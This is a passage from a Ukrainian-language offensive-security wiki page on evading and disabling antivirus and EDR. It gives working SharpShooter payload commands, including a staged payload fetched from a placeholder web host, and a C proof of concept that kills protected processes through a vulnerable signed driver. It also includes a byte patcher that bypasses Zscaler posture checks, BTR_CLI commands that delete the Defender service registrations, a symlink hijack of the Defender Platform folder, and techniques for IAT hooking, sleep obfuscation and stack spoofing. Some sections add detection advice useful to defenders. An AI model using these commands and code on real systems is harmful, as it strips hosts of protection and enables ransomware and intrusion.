- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання Python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – знищення AV/EDR з простору ядра

Storm-2603 використовував невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед розгортанням ransomware. Інструмент постачає **власний вразливий, але *підписаний* драйвер** і використовує його для виконання привілейованих операцій ядра, які не можуть заблокувати навіть AV-служби Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ключові висновки
1. **Підписаний драйвер**: Файл, що записується на диск, — `ServiceMouse.sys`, але насправді це легітимно підписаний драйвер `AToolsKrnl64.sys` з «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть за ввімкненого Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **kernel service**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із userland.
3. **IOCTLs, які надає драйвер**
   | Код IOCTL | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для зупинки служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю оминає захисти user-mode; код, що виконується в kernel, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти kernel незалежно від PPL/PP, ELAM та інших функцій посилення захисту.

Виявлення / пом’якшення ризиків
• Увімкніть список вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *kernel* і створюйте сповіщення, коли драйвер завантажується з каталогу, доступного для запису всім користувачам, або відсутній у списку дозволених.
• Відстежуйте дескриптори user-mode до користувацьких об’єктів пристроїв, після яких виконуються підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector шляхом виправлення бінарних файлів на диску

**Client Connector** від Zscaler локально застосовує правила стану пристрою та використовує Windows RPC для передавання результатів іншим компонентам. Два слабкі рішення в дизайні уможливлюють повний обхід:

1. Перевірка стану пристрою виконується **повністю на стороні клієнта** (на сервер надсилається логічне значення).
2. Внутрішні кінцеві точки RPC лише перевіряють, чи **підписаний Zscaler** виконуваний файл, що встановлює з’єднання (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Виправивши чотири підписані бінарні файли на диску**, можна нейтралізувати обидва механізми:

| Бінарний файл | Вихідна логіка, яку виправлено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка вважається пройденою |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може підключатися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Обійдено |

Фрагмент мінімального патчера:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану показують **зелений статус/відповідність вимогам**.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC іменованих каналів (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як кілька байтових патчів можуть обійти рішення про довіру, що ухвалюються суто на стороні клієнта, і прості перевірки підпису.

## Зловживання довіреною функціональністю Microsoft Defender `BTR.sys`

Драйвер **Boot-Time Removal** у Defender — корисний контрприклад класичному BYOVD. `BTR.sys` — легітимний компонент виправлення від Microsoft із цифровим підписом, без помилки пошкодження пам’яті та інтерфейсу IOCTL; натомість після отримання прав адміністратора й `SeLoadDriverPrivilege` оператор може підробити приватну транзакцію виправлення та виконати призначені операції з файлами й реєстром у Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початковий доступ чи підвищення привілеїв**; драйвер можна витягти з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, а не імпортувати помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender зберігає ресурс у файлі з випадковою назвою `[a-z]{8}.sys` і реєструє однойменну службу ядра. `DriverEntry` читає значення `Args` служби, відкриває вказаний альтернативний потік даних NTFS, розшифровує та перевіряє список дій, записує дані зворотного зв’язку й після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб драйвер вивантажився, а не залишався в пам’яті. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один blob, зашифрований RC4. У проаналізованих збірках використовується фіксований ключ довжиною 256 байтів, тож шифрування не є межею авторизації. Коректний plaintext містить глобальний заголовок довжиною 24 байти (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, отриманий із payload), за яким ідуть шлях до feedback-файлу у форматі UTF-16 із завершальним нульовим символом і довільна кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що завершуються **рівно чотирма нульовими байтами**. Кожна область заголовка/даних перевіряється окремо за допомогою CRC-32 із поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Підтримувані ID дій надають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалити файл, зокрема заблокований |
| 2 | `[UTF-16 path]` | Видалити порожню директорію |
| 3 | `[Flags][source][destination]` | Перемістити файл у вибраний зловмисником захищений шлях; порожнє значення destination означає видалення |
| 4 | `[Flags][key path]` | Рекурсивно видалити ключ реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалити значення реєстру |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створити/оновити значення реєстру та створити відсутні шляхи до ключів |

Для дій 5 і 6 роздільником ключа/значення у переданих даних є **дві послідовні зворотні скісні риски**; шлях у звичному форматі не буде правильно розділено. Файл feedback здебільшого віддзеркалює запит, але перші чотири байти даних кожного елемента стають його результівним `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля flags, BTR переміщує шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Робочий процес `BTR_CLI` та вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік feedback, серіалізує/обчислює контрольні суми/шифрує пов’язані дії, напряму створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер із типом запуску system-start для `-trigger boot`. Пряме внесення даних до реєстру оминає звичайний шлях SCM `CreateServiceW`, тож **не генерує** подію встановлення служби Event ID 7045. Артефакти, створені для запуску під час завантаження, згодом можна видалити командою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry` до готовності стеку сховища та посилання `SystemRoot`. `Start=1` разом із групою високого пріоритету `Boot Bus Extender` натомість забезпечує виконання на Phase 1: NTFS уже доступна, але багато драйверів безпеки із запуском під час завантаження та служб EDR у user mode ще не ініціалізовані. Фільтри, що запускаються під час завантаження, як-от `WdFilter`, уже можуть бути завантажені, однак BTR може видалити їхні бінарні файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до їх запуску SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після перевірки драйверів для завантаження та має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в одній транзакції. PoC додає перед Action 1 дію для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, а потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує кількість доказів, а збереження зворотного зв’язку в `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції з високою інформативністю для виявлення

Правила, що перевіряють лише підпис, і список блокування вразливих драйверів Microsoft не протидіють зловживанню передбаченою функціональністю BTR. Надавайте перевагу таким поведінковим кореляціям, відокремлюючи легітимне походження Defender від запуску довільним процесом.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` трапляється завжди під час підготовки BTR. Особливо підозрілим є ADS `.dat`, приєднаний до того самого `.sys`, оскільки легітимний Defender зазвичай зберігає зворотний зв’язок у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** пов’язуйте пряме створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>` із вмістом `Args=...:changelist` і `Group=Boot Bus Extender` із відсутністю відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** пов’язуйте завантаження відомого драйвера BTR не з походженням Defender із подальшим видаленням файлів, яке приписується `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте й аудіюйте призначення/увімкнення `SeLoadDriverPrivilege`; одного лише підпису Microsoft недостатньо, щоб вважати драйвер надійним, якщо драйвер засобу безпеки підготовлено через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписувачів/рівнів, щоб лише захищені процеси того самого або вищого рівня могли втручатися один в одного. Для наступу: якщо ви можете легітимно запустити бінарний файл із підтримкою PPL і керувати його аргументами, можна перетворити нешкідливу функціональність (наприклад, ведення журналу) на обмежений примітив запису з підтримкою PPL, спрямований на захищені каталоги, які використовуються AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (і всі завантажені DLL) мають бути підписані EKU із підтримкою PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, що відповідає підписувачу бінарного файлу (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильні рівні призведуть до помилки створення.

Також дивіться ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Допоміжний інструмент із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту й передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Шаблон використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає себе повторно та приймає параметр для запису файлу журналу за вказаним викликачем шляхом.
- Якщо його запущено як процес PPL, запис файлу виконується з підтримкою PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб вказати на зазвичай захищені розташування.

Помічники для коротких шляхів 8.3
- Перегляд коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримання короткого шляху в cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (узагальнено)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із `CREATE_PROTECTED_PROCESS`, використовуючи launcher (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент шляху до журналу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває/блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, встановивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із підтримкою PPL виконується до того, як AV заблокує свої бінарні файли, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Нотатки й обмеження
- Ви не можете контролювати вміст, який записує ClipUp, а лише місце запису; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби потрібні локальні права адміністратора/SYSTEM і можливість перезавантаження.
- Час має вирішальне значення: цільовий файл не повинен бути відкритим; виконання під час завантаження дає змогу уникнути блокування файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо його запускають нестандартні програми, приблизно під час завантаження.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і стабільний запуск перед Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів у каталогах Defender/Platform; неочікуване створення/зміна файлів процесами з прапорцями захищеного процесу.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівнів PPL процесами, що не належать до AV.

Заходи захисту
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист від втручання Defender і захист раннього запуску ввімкнені; перевіряйте помилки запуску, які вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте вимкнення генерації коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Втручання в Microsoft Defender через Symlink Hijack папки версії Platform

Windows Defender вибирає платформу для запуску, перелічуючи підкаталоги в:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підкаталог із найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час цього вибору він довіряє записам каталогів, зокрема точкам повторного аналізу каталогів (symlink). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмиснику, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/symlink у папці Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані інструменти (`mklink`)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору платформи довіряє записам каталогів і вибирає лексикографічно найвищу версію, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступний для запису клон поточної папки платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть усередині Platform символьне посилання на каталог із вищою версією, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендовано перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слідкуйте за шляхом нового процесу в `C:\TMP\AV\` і за тим, щоб конфігурація служби та реєстр відображали це розташування.

Варіанти post-exploitation
- DLL sideloading/code execution: розмістіть або замініть DLL, які Defender завантажує з каталогу своєї програми, щоб виконувати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Зупинка служби/відмова в обслуговуванні: видаліть symlink версії, щоб під час наступного запуску налаштований шлях не вирішувався, і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не надає підвищення привілеїв; для неї потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime-ухилення з C2 implant до самого цільового модуля, перехопивши його Import Address Table (IAT) і перенаправивши вибрані API через контрольований зловмисником position-independent code (PIC). Це узагальнює ухилення за межі невеликої кількості API, доступних у багатьох kits (наприклад, CreateProcessA), і поширює ті самі засоби захисту на BOFs і post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Високорівневий підхід
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (на початку або як companion). PIC має бути самодостатнім і position-independent.
- Коли host DLL завантажується, пройдіть її IMAGE_IMPORT_DESCRIPTOR і замініть записи IAT для цільових imports (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує ухилення перед tail-call до адреси реального API. Типові способи ухилення:
  - Маскування/демаскування пам’яті під час виклику (наприклад, шифрування beacon regions, RWX→RX, зміна назв/прав доступу сторінок), а потім відновлення стану після виклику.
  - Call-stack spoofing: створення безпечного стека й перехід до цільового API, щоб аналіз call stack визначав очікувані frames.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте interface, щоб скрипт Aggressor (або його аналог) міг реєструвати API для перехоплення в Beacon, BOFs і post-ex DLLs.

Навіщо тут IAT hooking
- Працює з будь-яким кодом, який використовує перехоплений import, без змін у коді інструментів і без залежності від того, що Beacon проксуватиме певні API.
- Охоплює post-ex DLLs: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати до їхніх викликів API ті самі методи маскування та ухилення від аналізу стека.
- Відновлює надійне використання post-ex команд, що запускають процеси, проти детекцій на основі call stack, обгортаючи CreateProcessA/W.

Мінімальний ескіз IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосуйте патч після relocations/ASLR і до першого використання імпорту. Reflective loaders, як-от TitanLdr/AceLdr, демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers компактними та PIC-safe; визначайте справжній API через початкове значення IAT, збережене до патчингу, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки доступними для запису й виконання одночасно.

Call‑stack spoofing stub
- PIC stubs у стилі Draugr створюють фальшивий ланцюжок викликів (return addresses у benign modules), а потім переходять до справжнього API.
- Це обходить виявлення, яке очікує канонічні стеки від Beacon/BOFs під час викликів чутливих API.
- Поєднуйте це з техніками stack cutting/stack stitching, щоб опинитися в очікуваних frames перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро отримували переваги того самого шляху ухилення без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза image (heap/anon); періодична перевірка import pointers.
- Аномалії стека: return addresses, що не належать завантаженим images; різкі переходи до non-image PIC; невідповідна ancestry RtlUserThreadStart.
- Телеметрія loader: записи в IAT із процесу; рання активність DllMain, що змінює import thunks; неочікувані RX regions, створені під час завантаження.
- Ухилення від image-load: якщо виконується hooking LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані building blocks і приклади
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks через resident PICO

Якщо ви керуєте reflective loader, можна виконати hooking імпортів **під час** `ProcessImports()`, замінивши вказівник `GetProcAddress` у loader на власний resolver, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (persistent PIC object), який залишиться після звільнення transient loader PIC.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте пошук hooks на основі hash, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, поверніть його; інакше передайте запит справжньому `GetProcAddress`.
- Реєструйте цілі hooks під час link time за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається чинним, оскільки розміщений у resident PICO.

У результаті відбувається **import-time IAT redirection** без патчингу code section завантаженої DLL після її завантаження.

### Примусове додавання hookable imports, коли ціль використовує PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція фактично є в IAT цілі. Якщо модуль розв’язує API через PEB-walk + hash (без import entry), додайте справжній імпорт, щоб loader обробив його через `ProcessImports()`:

- Замініть розв’язання hashed exports (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Компілятор створить запис IAT, що дасть змогу перехопити виклик, коли reflective loader розв’язуватиме імпорти.

### Ekko-style sleep/idle obfuscation без патчингу `Sleep()`

Замість патчингу `Sleep` перехоплюйте **фактичні wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюжок obfuscation у стилі Ekko, який шифрує image у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` із заданими `CONTEXT` frames.
- Типовий ланцюжок (x64): встановити для image `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` увесь mapped image → виконати блокувальне очікування → розшифрувати RC4 → **відновити дозволи для кожної секції**, перебираючи PE sections → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька frames і задайте registers (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для тривалого очікування (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив роботу, поки image замаскований. Цей шаблон приховує модуль від сканерів під час простою та уникає класичного сигнатурного ознаки “patched `Sleep()`”.

Ідеї для виявлення (на основі телеметрії)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суцільних буферів розміром із image.
- `VirtualProtect` для великого діапазону з подальшим відновленням дозволів для кожної секції.

### Runtime CFG registration для sleep-obfuscation gadgets

На цілях із CFG перший непрямий перехід до gadget посередині функції, як-от `jmp [rbx]` або `jmp rdi`, зазвичай призведе до аварійного завершення процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata модуля. Щоб ланцюжки в стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте всі непрямі destinations, які використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **бази image** і охоплювати **повний розмір image**.
- Для вручну відображених/PIC/stomped regions натомість використовуйте **базу allocation** і розмір allocation.
- Позначайте не лише dispatch gadget, а й exports, до яких переходять непрямо (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які executable sections під контролем атакувальника, що стануть непрямими цілями.

Це перетворює sleep chains у стилі ROP/JOP із «працює лише в процесах без CFG» на придатну для повторного використання primitive для `explorer.exe`, браузерів, `svchost.exe` та інших endpoints, зібраних із `/guard:cf`.

### CET-safe stack spoofing для потоків у стані очікування

Повна заміна `CONTEXT` помітна й може спричинити проблеми в системах із CET Shadow Stack, оскільки підроблений `Rip` має відповідати hardware shadow stack. Безпечніший шаблон маскування під час очікування:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі й прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть справжній TEB/TIB поточного потоку.
- Отримайте справжній контекст потоку, що очікує, через `GetThreadContext`.
- Скопіюйте в spoof context **лише** справжній `Rip`, залишивши підроблений стан `Rsp`/стека без змін.
- Під час очікування скопіюйте `NT_TIB` spoof thread у TEB поточного потоку, щоб stack walkers розмотували стек у межах легітимного діапазону.
- Після завершення очікування відновіть початкові TIB і контекст потоку.

Це зберігає instruction pointer, узгоджений із CET, і водночас вводить в оману EDR stack walkers, які покладаються на метадані стека TEB під час перевірки unwind.

### Альтернатива на основі APC: Kraken Mask

Якщо dispatch через timer queue надто сигнатурний, ту саму послідовність sleep-encrypt-spoof-restore можна виконати із призупиненого helper thread за допомогою queued APCs:<sup>[[27]](#references)</sup>

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Поставте підготовлені `CONTEXT` frames/APCs у чергу через `NtQueueApcThread` і виконайте їх через `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку helper thread, щоб уникнути вичерпання стандартного стека потоку розміром 64 KB.
